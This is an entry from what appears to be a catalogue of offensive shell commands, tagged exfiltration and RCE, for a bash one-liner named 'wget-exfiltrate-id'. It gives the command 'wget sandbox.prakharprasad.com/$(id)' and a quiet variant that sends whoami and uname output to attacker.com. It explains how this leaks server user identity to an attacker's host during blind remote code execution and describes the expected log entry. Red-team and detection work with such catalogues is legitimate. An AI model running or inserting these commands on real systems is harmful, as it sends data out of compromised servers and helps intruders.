---
id: cmd-uuid-3
data: wget sandbox.prakharprasad.com/$(id)
tags:
  - exfiltration
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.124Z'
verified: false
validated: true
submitted: true
---
# wget-exfiltrate-id

## Command

```bash
wget sandbox.prakharprasad.com/$(id)
```

## Description

Downloads content from the specified URL, where the path includes the output of $(id), effectively exfiltrating user identity information to the attacker's server in a blind RCE exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sandbox.prakharprasad.com/$(id) | URL to fetch, with $(id) substituting server user info | Yes |

## Examples

### Basic Usage

```bash
wget sandbox.prakharprasad.com/$(id)
```

### Advanced Usage

```bash
wget -q attacker.com/$(whoami)/$(uname -a)  # Quiet mode with more info
```

## Expected Output

HTTP request to attacker's server logged with path containing 'uid=33(www-data)...', no local output visible.

## Related

- [[commands/id-exfiltrate]]
